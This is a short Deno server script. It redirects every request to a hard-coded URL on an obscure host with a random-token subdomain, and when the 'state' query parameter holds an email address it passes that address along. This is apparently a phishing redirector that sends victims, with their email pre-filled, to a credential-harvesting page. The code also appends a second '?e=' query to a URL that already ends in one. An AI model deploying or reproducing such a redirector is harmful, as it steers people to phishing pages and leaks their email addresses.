const PORT = Number(Deno.env.get("PORT") || 8080);

const DESTINATION = "https://5waepkvzeqhxu2pkwugplrflubwo4gfpklpgfs2ief25pm63hdya.gatewaypie.com/7YBHqrkkD3pp6rUM9cSroGzuGK9S3mLLSCF117PbOPA?e=";

Deno.serve({ port: PORT }, (req) => {
  const url = new URL(req.url);
  const state = url.searchParams.get("state");

  let target = DESTINATION;
  if (state && state.includes("@")) {
    const params = new URLSearchParams({ e: state });
    target += `?${params.toString()}`;
  }

  return Response.redirect(target, 302);
});
